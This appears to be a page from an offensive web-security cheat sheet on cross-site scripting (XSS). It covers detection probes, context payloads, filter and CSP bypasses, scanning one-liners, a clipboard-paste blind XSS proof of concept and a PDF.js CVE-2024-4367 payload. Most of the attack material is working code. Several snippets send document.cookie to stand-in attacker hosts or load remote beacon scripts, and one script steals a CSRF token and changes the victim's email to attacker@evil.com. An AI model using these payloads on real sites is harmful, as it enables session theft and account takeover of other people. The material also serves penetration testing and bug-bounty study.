---
tags:
  - Web
---

# :material-language-javascript: Cross-Site Scripting (XSS)

<span class="pill pill-medium">common</span> <span class="pill pill-info">web</span>

**XSS** lets you execute JavaScript in another user's browser in the context of the target origin. That means stealing sessions, keylogging, rewriting the page, or driving account takeover.

!!! abstract "TL;DR"
    Find where your input is reflected/stored, figure out the **HTML context** it lands in, and break out of that context to inject a `<script>` or event handler.

## :material-shape: The three types

| Type | Where the payload lives | Trigger |
| --- | --- | --- |
| **Reflected** | In the immediate response (URL/param) | Victim clicks your crafted link |
| **Stored** | Saved server-side (comment, profile) | Any user who views the page |
| **DOM-based** | Never touches the server; client JS sinks | Fragment / client-side routing |

## :material-magnify: Detection

Inject a unique marker and see where it lands **unencoded**:

```html
xsspoc1337
"><svg/onload=alert(document.domain)>
'"><img src=x onerror=alert(1)>
javascript:alert(1)
```

Then view source / the DOM: is your marker inside a tag, an attribute, a `<script>` block, or an HTML comment? The context decides the payload.

### Gareth Heyes

```html
<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
```

### Test a lot of stuff Instantly

```html
qw'"><video src=x onerror=confirm(23)>${{77}}${77}@(7*7)'w"\
 n
 įqw'"><svg///onload=confirm(23)>${{7*7}}${7*7}@(7*7)'w"\ įqw'"><img src=x onerror=alert(1)>${{7*7}}${7*7}@(7*7)'w"\

bluezįqw'"><img src="x" onerror="alert(1)">${{7``7}}${7``7}@(7*7)'w"\bluezįqw'"><img src="x" onerror="alert(1)"><img src="x" onerror="alert(1)">

w'\"><video src=x onerror=confirm(23)>${{77}}${77}@(7*7)'w\"
```

[https://shazzer.co.uk/vectors](https://shazzer.co.uk/vectors)

https://cspbypass.com

### Shellsec oneliners

#### 1. Wayback + httpx + GF + Dalfox

```bash
cat domains.txt | httpx -silent -ports 80,443,8080,8443,3000,8000 | waybackurls | grep "=" | uro | gf xss | qsreplace '"><script>alert(1)</script>' | while read url; do curl -s "$url" | grep -q "<script>alert(1)</script>" && echo "[XSS] $url"; done
```

#### 2. Gospider + Dalfox

```bash
gospider -S URLs.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -oP "https?://[^ ]+" | grep "=" | qsreplace -a | dalfox pipe
```

#### 3. Wayback + GF + Blind XSS via Dalfox

```bash
waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u | dalfox -b yoursubdomain.xss.ht pipe
```

#### 4. Gospider + Dalfox (Deep Crawl)

```bash
gospider -S targets.txt -c 20 -d 3 --js --sitemap --robots | grep -oP "https?://[^\s]+" | grep "=" | uro | dalfox pipe -o gospider_xss.txt
```

#### 5. Dalfox Direct with Blind XSS

```bash
cat urls.txt | dalfox pipe -b yourdomain.xss
```

## :material-code-tags: Context-aware payloads

=== "HTML body"

    ```html
    <script>alert(document.domain)</script>
    <img src=x onerror=alert(document.domain)>
    <svg onload=alert(document.domain)>
    ```

=== "Inside an attribute"

    ```html
    " autofocus onfocus=alert(1) x="
    "><script>alert(1)</script>
    ' onmouseover='alert(1)
    ```

=== "Inside `<script>`"

    ```javascript
    </script><script>alert(1)</script>
    ';alert(1);//
    ${alert(1)}      // template literal context
    ```

=== "DOM sink"

    Look for input flowing into dangerous sinks:
    ```javascript
    element.innerHTML = location.hash        // sink
    document.write(location.search)
    eval(userControlled)
    // Source examples: location.hash, location.search, document.referrer, postMessage
    ```

### Inside javascript code

```javascript
'-alert(1)-'
';-alert(1)//
\';alert(1)//
```

## :material-filter: WAF / filter bypass

<span class="pill pill-hard">when the easy stuff is blocked</span>

```html
<!-- Case & no parentheses -->
<sVg/OnLoAd=alert`1`>
<!-- Encoded event handlers -->
<img src=x onerror=&#97;lert(1)>
<!-- No spaces (use slashes/newlines) -->
<img/src/onerror=alert(1)>
<!-- Nested to defeat naive tag stripping -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- Exotic tags/events -->
<details/open/ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

!!! tip "HTML5 event-handler cheat"
    When `<script>` is filtered, event handlers on `svg`, `img`, `body`, `details`, `video`, `iframe`, and `input` are your friends. [PortSwigger's XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) is the canonical list.

### CSP stuff

<https://cspbypass.com>

[https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)

[https://xssy.uk/lab/192](https://xssy.uk/lab/192)

### Payloads esquizos

```html
<body contenteditable onbeforeinput=alert(23)>
<video onpointermove=prompt`8`>
<svg><animatetransform onbegin=alert(1)>
```

### Bypasses

#### Upgrade HTML injection

```html
<img src="//$ATTACKER:9999/test.img">
```

#### Common ones

```
Html entity encoded
&lt;script&gt;alert('XSS')&lt;/script&gt;

Decimal encoded
&#60;script&#62;alert('XSS')&#60;/script&#62;

UTF-7
+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-

External script loading
<script src="http://example.com/malicious-script.js"></script>

Foo bar bypass
<22 foo="bar<img src=x onerror=alert(2)>">hello</22>

Using `` instead of parenthesis
onerror=alert`1`
```

### Cloudflare bypasses

on Next.js 14.1.4!

```
‘>alert(154)<​/script><​script/154=’;;;;;;;
"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
```

!!! bug "Editor's note — the first line contains invisible characters"
    Copy it, don't retype it: a **U+200B zero-width space** follows each `<`, and the
    quotes are curly **U+2018/U+2019**. Escaped: `‘>alert(154)<​/script><​script/154=’;;;;;;;`

### Bypass firefox and some Wafs

```
"><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs="alert('chux')" AutOfoCus="" />

<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">

<img src="X" onerror=top[8680439..toString(30)](1337)> 

<script>top[8680439..toString(30)](1337)</script>
```

### Homoglifos

| Unicode | Character | Símbolo |
| --- | --- | --- |
| %EF%BC%9C | FULLWIDTH LESS­THAN | < |
| %EF%BC%9E | FULLWIDTH MORE­THAN | > |
| %CA%BA | MODIFIER LETTER DOUBLE PRIME | " |
| %CA%B9 | MODIFIER LETTER PRIME | ' |

## :material-alert-decagram: Edge cases & gotchas

=== "Tricky contexts"

    | Your input lands in… | You must first… |
    | --- | --- |
    | `<textarea>`, `<title>`, `<noscript>` | close the tag: `</textarea><svg onload=…>` |
    | inside an HTML comment `<!-- x -->` | close it: `--><svg onload=…>` |
    | a JS string `var a='X'` | break out **and** balance quotes: `';alert(1)//` |
    | a URL attribute (`href`, `src`) | `javascript:alert(1)` (no tag breakout needed) |
    | an existing `on*` handler value | just inject JS, no `<`/`>` available |

=== "CSP bypass"

    A CSP blocking inline script isn't game-over:

    - **JSONP endpoints** on an allowlisted host: `<script src="//allowed/api?callback=alert">`.
    - **`unsafe-eval` present** → gadget via a templating lib already on the page (Angular, etc.).
    - **Missing `base-uri`** → inject `<base href="//evil">` to hijack relative script loads.
    - **`nonce` reuse / predictable nonce** → reuse it.
    - **Dangling-markup** exfil when script is fully blocked: `<img src='//evil/?` swallows
      the rest of the page (including a CSRF token) as the URL.

=== "mXSS & DOMPurify"

    **Mutation XSS**: the browser re-parses `innerHTML` and *mutates* your markup
    into something executable that the sanitizer didn't see (e.g. inside
    `<svg>`/`<math>` foreign-content, or `<noscript>` toggling). Sanitizer version
    matters — old DOMPurify has known bypasses. Always note the exact library +
    version in your report.

=== "Blind & length-limited"

    - **Blind XSS** (fires later in an admin panel, support ticket, log viewer):
      plant a beacon payload and wait — `"><script src=//xss.report/x></script>`.
      Use an XSS-hunter-style catcher that reports DOM + cookies + URL.
    - **Length-limited field**: load the real payload externally with the shortest
      possible bootstrap — `<script src=//x.x>` or `<svg onload=eval(name)>` then
      stash the code in `window.name`.

!!! bug "Why it reflects but won't fire"
    - **It's double-encoded** — you see `&lt;svg` in the DOM, not `<svg`. The app
      encoded once, the browser decoded once; you need it to reach the parser raw.
    - **The sink is a *text* sink** (`textContent`, `innerText`, `setAttribute` on a
      non-URL attr) — reflection ≠ execution. Look for `innerHTML`, `outerHTML`,
      `document.write`, `eval`, `setTimeout(string)`, `location=`, jQuery `$(html)`.
    - **`SameSite=Lax` (the modern default)** blocks your cross-site cookie
      auto-send for CSRF-style follow-ups, but same-origin XSS JS still carries the
      cookie — pivot to in-page actions.
    - **Framework auto-escape** (React/Vue/Angular) neutralizes most reflection —
      hunt the escape hatches: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`,
      `bypassSecurityTrustHtml`, or client-side template injection (`{{7*7}}`).

## :material-content-paste: Blind XSS via clipboard paste handling

*From "Blind XSS via Clipboard Paste Handling: A Detailed Guide" by [coffinxp](https://medium.com/@coffinxp).*

A paste event carries **more than text**. The clipboard holds several flavours of the same content at once, and `text/html` is one of them. If a rich-text field reads that flavour and drops it into `innerHTML`, the attacker never has to touch the target application — the victim carries the payload in for them.

The requirements are narrow and easy to check: the field accepts HTML from the clipboard on paste, inserts it into the DOM without sanitising, and stores it somewhere a second person will eventually read.

### Attack flow

1. **Attacker prepares a page.** A copy button writes two clipboard flavours at once: an innocent `text/plain` string the victim can see, and an HTML payload they can't.
2. **Victim opens a rich-text field.** A comment editor, a support ticket, a WYSIWYG box, a CMS admin panel.
3. **Victim presses Ctrl+V.** The handler prefers `text/html`, so the hidden markup goes in instead of the coupon code.
4. **Payload executes** in the application's origin — cookies, session tokens, CSRF tokens all in reach.
5. **It goes blind.** If the paste is *saved* (a ticket, a comment) and an admin opens it later, the payload fires in the admin's browser and the attacker only ever sees the callback.

### Proof of concept

=== "Attacker page (`copy.html`)"

    The lure is the visible `SALE2025`; the payload rides along in the `text/html` slot.

    ```html
    <!doctype html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Super Sale - Limited Coupons</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background: linear-gradient(120deg, #f6d365 0%, #fda085 100%);
          text-align: center;
          padding: 50px;
        }
        .card {
          background: #fff;
          border-radius: 12px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.15);
          display: inline-block;
          padding: 40px;
          max-width: 400px;
        }
        h1 {
          margin-bottom: 10px;
          color: #e74c3c;
        }
        p {
          margin-bottom: 20px;
          font-size: 16px;
          color: #444;
        }
        button {
          background: #e74c3c;
          color: white;
          border: none;
          padding: 12px 24px;
          border-radius: 6px;
          cursor: pointer;
          font-size: 16px;
        }
        button:hover {
          background: #c0392b;
        }
      </style>
    </head>
    <body>
      <div class="card">
        <h1>🔥R Mega Sale oupon</h1>
        <p>Click the button to copy your exclusive coupon code and save big at checkout!</p>
        <button id="copy">Copy Coupon</button>
      </div>

      <script>
        const htmlPayload = `<img src=x onerror="alert('XSS via paste')">`;
        document.getElementById('copy').addEventListener('click', () => {
          const onCopy = e => {
            e.clipboardData.setData('text/html', htmlPayload);
            e.clipboardData.setData('text/plain', 'SALE2025');
            e.preventDefault();
            document.removeEventListener('copy', onCopy);
          };
          document.addEventListener('copy', onCopy);
          document.execCommand('copy');
          alert('Coupon copied! Paste it into the store checkout box.');
        });
      </script>
    </body>
    </html>
    ```

=== "Vulnerable page (`victim.html`)"

    ```html
    <!doctype html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Checkout - Apply Coupon</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background: #f9f9f9;
          padding: 50px;
          text-align: center;
        }
        .checkout-box {
          background: #fff;
          border-radius: 12px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.1);
          display: inline-block;
          padding: 40px;
          max-width: 400px;
        }
        h2 {
          margin-bottom: 20px;
          color: #2c3e50;
        }
        #box {
          border: 2px dashed #ccc;
          padding: 15px;
          min-height: 60px;
          font-size: 16px;
          border-radius: 6px;
          outline: none;
        }
        #box:focus {
          border-color: #3498db;
        }
        p.note {
          color: #888;
          font-size: 14px;
          margin-top: 10px;
        }
      </style>
    </head>
    <body>
      <div class="checkout-box">
        <h2>Apply Your Coupon</h2>
        <div id="box" contenteditable="true"></div>
        <p class="note">👉R Click inside the box and pres <b>Ctrl+V</b> to paste your coupon.</p>
      </div>

      <script>
        const box = document.getElementById('box');
        box.addEventListener('paste', e => {
          const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
          e.preventDefault();
          // Vulnerable: directly inserting untrusted HTML
          box.innerHTML = html;
        });
      </script>
    </body>
    </html>
    ```

=== "The vulnerable pattern"

    This is the shape to grep for in the target's JS — `getData('text/html')` feeding `innerHTML`:

    ```javascript
    element.addEventListener('paste', e => {
    const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
    e.preventDefault();
    element.innerHTML = html; // ⚠️ Dangerous
    });
    ```

Open `copy.html`, click **Copy Coupon**, then open `victim.html`, click inside the box and press Ctrl+V — the alert fires.

### Payloads

Swap the `alert` for something that reports back, and the local demo becomes a real blind-XSS probe (Burp Collaborator, interact.sh, your own catcher):

```javascript
const htmlPayload = `<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">`;
or 
const htmlPayload = `'\"><script src=https://xss.report/c/coffinxp></script>`;
```

### Where to test

- Comment systems with formatting options.
- Chat or messaging platforms that allow rich text.
- Support ticket or CRM tools.
- Content Management Systems (CMS) admin panels.

Plain `input` and `textarea` fields are dead ends — they only ever take `text/plain`, so there is no HTML flavour to smuggle.

!!! tip "Reporting this one"
    It looks weird in a triage queue, so make it concrete: attacker PoC page plus the exact paste action as repro steps, a video or screenshots of the alert firing, and an impact statement that spells out the blind case — an admin opening the stored ticket executes the payload in an authenticated admin session.

## :material-file-pdf-box: PDF.js arbitrary JS execution — CVE-2024-4367

*From "PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367)" by [coffinxp](https://medium.com/@coffinxp).*

Mozilla's PDF.js is missing a type check when handling font data, so a `FontMatrix` entry can carry JavaScript straight into the viewer's origin. Any site that renders uploaded PDFs in the browser with a vulnerable build hands you XSS from a file upload.

**Finding it:** locate a file upload that accepts PDFs and renders them in-page, then check the PDF.js version with Wappalyzer on that endpoint. Below **4.2.67** — or no version reported at all — is worth a shot.

**Payload:** embed it by manipulating the `FontMatrix` array inside the PDF.

```text
/FontMatrix [1 0 0 1 0 (0\); alert('Exploited CVE-2024–4367')//)]
```

Upload the crafted PDF and the viewer pops your JavaScript — swap the `alert` for `document.cookie` to make the report land. Pre-built PDFs (domain + cookie popup, calculator RCE variants) are in [coffinxp's pdFExploit repo](https://github.com/coffinxp).

**Impact:** script execution in the user's session (session tokens, authenticated actions, data exposure). Where PDF.js is embedded in a higher-privilege host such as an Electron app, the same bug reaches arbitrary code execution and full system compromise.

## :material-flash: Turning XSS into impact

Not `alert(1)` in a report — show real impact.

!!! loot "Session / cookie theft"
    ```javascript
    // Exfil non-HttpOnly cookies to your listener
    new Image().src='https://ATTACKER/c?'+encodeURIComponent(document.cookie);
    // Or full request-capable exfil
    fetch('https://ATTACKER/c',{method:'POST',body:document.cookie});
    ```
    Catch it with `python3 -m http.server` or an interactsh/Burp Collaborator URL.

!!! loot "Account takeover via CSRF-token theft"
    ```javascript
    fetch('/account',{credentials:'include'})
      .then(r=>r.text())
      .then(html=>{
        const t = html.match(/csrf" value="([^"]+)"/)[1];
        // now submit an email/password change with the stolen token
        fetch('/account/email',{method:'POST',credentials:'include',
          headers:{'Content-Type':'application/x-www-form-urlencoded'},
          body:`csrf=${t}&email=attacker@evil.com`});
      });
    ```

!!! opsec "HttpOnly stops cookie theft, not XSS"
    If cookies are `HttpOnly`, pivot to **in-browser actions** (change email, add API key, read data) rather than exfiltrating the cookie. The session is still yours while the JS runs.

## :material-link-variant: Related

- Pairs with [Auth Bypass](auth-bypass.md) for full account takeover.
- CSP bypass research overlaps with [SSRF](ssrf.md) exfil techniques.
- Reference: [OWASP XSS](https://owasp.org/www-community/attacks/xss/).
